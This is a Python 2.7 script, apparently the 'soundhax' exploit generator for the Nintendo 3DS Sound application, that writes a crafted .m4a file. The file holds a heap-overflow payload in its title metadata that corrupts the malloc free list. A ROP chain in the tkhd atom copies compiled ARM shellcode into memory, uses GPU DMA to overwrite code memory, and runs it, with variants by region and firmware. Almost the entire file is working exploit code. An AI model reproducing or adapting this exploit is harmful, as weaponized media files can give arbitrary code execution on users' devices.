#!/usr/bin/python2.7

import sys
from struct import pack
from subprocess import call
from constants import STAGE2_SIZE, constants_21_22, constants_3x_and_later
from os import environ, path, name as osname

REGION = "usa"
TYPE = "old"
FIRM = "post5"
if len(sys.argv) > 1:
    REGION = sys.argv[1].lower()

if len(sys.argv) > 2:
    TYPE = sys.argv[2].lower()

if len(sys.argv) > 3:
    FIRM = sys.argv[3].lower()

constants = constants_3x_and_later if FIRM != "v21and22" else constants_21_22

for name, regions in constants.items():
    if REGION not in regions:
        print("Error: {} does not contain a constant for {}".format(REGION,
                                                                    name))
    globals()[name] = regions[REGION]

def p(x):
    return pack("<I", x)

def pb(x):
    return pack(">I", x)

def get_arm_none_eabi_binutils_exec(name):
    exec_path = path.join(environ["DEVKITARM"], "bin", "arm-none-eabi-{0}".format(name))
    if osname == "nt":
        exec_path = ''.join((exec_path[1], ':', exec_path[2:])).replace('/', '\\')
    return exec_path

def get_shellcode():
    # assemble stage 2
    call([get_arm_none_eabi_binutils_exec("gcc"), "-x", "assembler-with-cpp", "-nostartfiles", "-mcpu=mpcore",
        "-nostdlib", "-D", REGION.upper(), "-D", TYPE.upper(), "-D", FIRM.upper(), "-o", "stage2.bin", "stage2.s"])
    # generate raw instruction bytes
    call([get_arm_none_eabi_binutils_exec("objcopy"), "-O", "binary", "stage2.bin"])
    # read in the shellcode
    with open('stage2.bin', 'rb') as f:
        payload = f.read()
        assert len(payload) == STAGE2_SIZE
        return payload

# end = end1 + end2 in the code, pick end2 so end wraps to start+4
desired_end = start + 4 # to make size 4
magic_end = (desired_end - end1) % 2**32
assert (end1 + magic_end) % 2**32 == desired_end

malloc_free_list_head = heapctx + 0x3C

what = fake_free_chunk
where = malloc_free_list_head

r1 = what
r2 = where - 12

UNICODE_MARKER = '\xff\xfe' # unicode marker

exp = "<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
exp += " \x00"*((772-len(exp)) / 2)
assert len(exp) == 772

exp += "aaaa" # base
exp += p(magic_end) # r3
exp += p(r2) # r2
exp += p(r1) # r1

def pa_to_gpu(pa):
    return pa - 0x0C000000

def gpu_to_pa(gpua):
    return gpua + 0x0C000000

# 16:06:09 @yellows8 | "> readmem:11usr=CtrApp 0x002F5d00 0x100"
# "Using physical address: 0x27bf5d00 (in_address = 0x002f5d00)"
def code_va_to_pa(va):
    if TYPE == "old":
        if FIRM == "post5":
            return va + 0x23D00000
        else:
            return va + 0x23D00000 - 0x78000
    else:
        return va + 0x27900000

#starts at this pop
#.text:0027DB00 LDMFD           SP!, {R4-R10,PC}

payload = get_shellcode()

rop  = "AAAA" # r4
rop += "BBBB" # r5
rop += "CCCC" # r6
rop += "DDDD" # r7
rop += "EEEE" # r8
rop += "FFFF" # r9
rop += "GGGG" # r10
rop += p(pop_r0_pc) # pc
rop += p(payload_heap_addr) # dst
rop += p(pop_r1_pc)
rop += p(payload_stack_addr) # src
rop += p(pop_r2_thru_r6_pc) #pc
rop += p(STAGE2_SIZE) #length
rop += "bbbb" # r3
rop += "cccc" # r4
rop += "dddd" # r5
rop += "eeee" # r6
rop += p(memcpy_gadget) # pc
rop += "aaaa" # r4
rop += "bbbb" # r5
rop += "cccc" # r6
rop += "dddd" # r7
rop += "eeee" # r8
rop += "ffff" # r9
rop += "gggg" # r10
rop += p(pop_r0_pc)
rop += p(payload_heap_addr) # r0
rop += p(pop_r1_pc)
rop += p(0x1000)
rop += p(gpu_flushcache_gadget)
rop += "bbbb" # r4
rop += "cccc" # r5
rop += "dddd" # r6
rop += p(gpu_enqueue_gadget)
if REGION != 'kor':
    rop += "aaaa" # skipped
rop += p(4)
rop += p(payload_heap_addr)
rop += p(pa_to_gpu(code_va_to_pa(stage2_code_va)))
rop += p(STAGE2_SIZE)
rop += p(0)
rop += p(0)
rop += p(8)
rop += p(0)
if REGION == 'kor':
    rop += "aaaa" # skipped (with KOR the above gxcmd buffer is at sp+0 instead of sp+4, but stackframe size is the same)
rop += "AAAA" # r4
rop += "AAAA" # r5
rop += "AAAA" # r6
rop += "AAAA" # r7
rop += "AAAA" # r8
rop += "AAAA" # r9
if REGION != 'kor':
    rop += "AAAA" # r10
    rop += "AAAA" # r11
rop += p(pop_r0_pc) # pc
rop += p(0x10000000) # r0
rop += p(pop_r1_pc) # pc
rop += p(0) # r1
rop += p(sleep_gadget) # pc # {R4-R6,LR}
rop += "aaaa" # r4
rop += "bbbb" # r5
rop += "cccc" # r6
rop += p(stage2_code_va)
rop += payload

tkhd_data = 'A'*136 # padding
if REGION != 'kor':
    tkhd_data += 'A'*0x28 # padding
tkhd_data += rop # ROP starts here
tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000'.decode("hex")
tkhd_data += '0000000000000000010000000000000000000000000000400000000000000000000000'.decode("hex")

assert len(tkhd_data) < 0x800 # so we don't allocate off the tail.

l = [('ftyp', '4d344120000000004d3441206d70343269736f6d00000000'),
    ('mdat', '00'),
    ('moov',
        [
        ('mvhd', '00'),
        ('trak',
            [
            ('tkhd', tkhd_data.encode("hex")),
            ('mdia',
                [
                ('mdhd', '00000000aac54f45aac54f4500003e800000940000000000'),
                ('hdlr', '0000000000000000736f756e00000000000000000000000000'),
                ('minf',
                    [
                    ('smhd', '0000000000000000'),
                    ('dinf',
                        [
                        ('dref', [('url ', '00000001')])
                        ]),
                    ('stbl',
                        [
                        ('stsd', [('mp4a', [('esds', '000000000380808022000200048080801440150018000000fa000000fa0005808080021408068080800102')])]),
                        ('stsz', '00'),
                        ('stts', '00000000000000010000002500000400'),
                        ('stco', '000000000000000100000028'),
                        ('stsc', '0000000000000001000000010000002500000001')
                        ])
                    ])
                ])
            ]),
        ('udta',
            [('meta', [
                ('hdlr', '00000000000000006d6469726170706c000000000000000000'),
                ('ilst',
                    [('\xa9nam', [('data', '0000000100000000' + (UNICODE_MARKER + exp).encode("hex"))]),
                     ('\xa9ART', [('data', '00000001000000004e6564')]),
                     ('\xa9alb', [('data', '00000001000000004e696e74656e646f2033445320536f756e64')]),
                     ('\xa9day', [('data', '000000010000000032303030')]),
                     ('edoc', [('data', '00000001000000003344533100')]),
                     ('wtfs', [('data', '0000000100000000303032303500')]),
                     ('dicr', [('data', '0000000100000000343935414236383100')]),
                     ('dide', [('data', '0000000100000000343935414236383100')]),
                     ('tmrp', [('data', '000000010000000075706c6f61642c65646974446973747269627574652c6669727374446973747269627574652c7365636f6e644469737472696275746500')])
                     ])
                ])
            ])
        ])
    ]

prefixes = {
    'meta': '\x00\x00\x00\x00',
    'stsd': '\x00\x00\x00\x00\x00\x00\x00\x01',
    'dref': '\x00\x00\x00\x00\x00\x00\x00\x01',
    'mp4a': '\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\x3E\x80\x00\x00'
}

def to_string(tree):
    def internal(tree):
        sz = 0
        ret = ""
        for name, data in tree:
            if type(data) is str:
                rdata = data.decode("hex")
                chunk_size = len(rdata)
            else:
                chunk_size, rdata = internal(data)
                chunk_size
            chunk_size += 8

            prefix = prefixes.get(name, '')
            rdata = prefix + rdata
            chunk_size += len(prefix)

            sz += chunk_size
            ret += pb(chunk_size) + name + rdata
        return sz, ret
    _, res = internal(tree)
    return res

if TYPE == "new":
    fn = './soundhax-{}-{}.m4a'.format(REGION, "n3ds")
else:
    assert TYPE == "old"

    if FIRM == "v21and22":
        assert REGION in ("usa", "eur", "jpn")
        fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "v2.1and2.2")
    elif FIRM == "v3xand4x":
      fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "v3.xand4.x")
    else :
      fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "post5.0")

with open(fn, 'wb') as f:
  f.write(to_string(l))
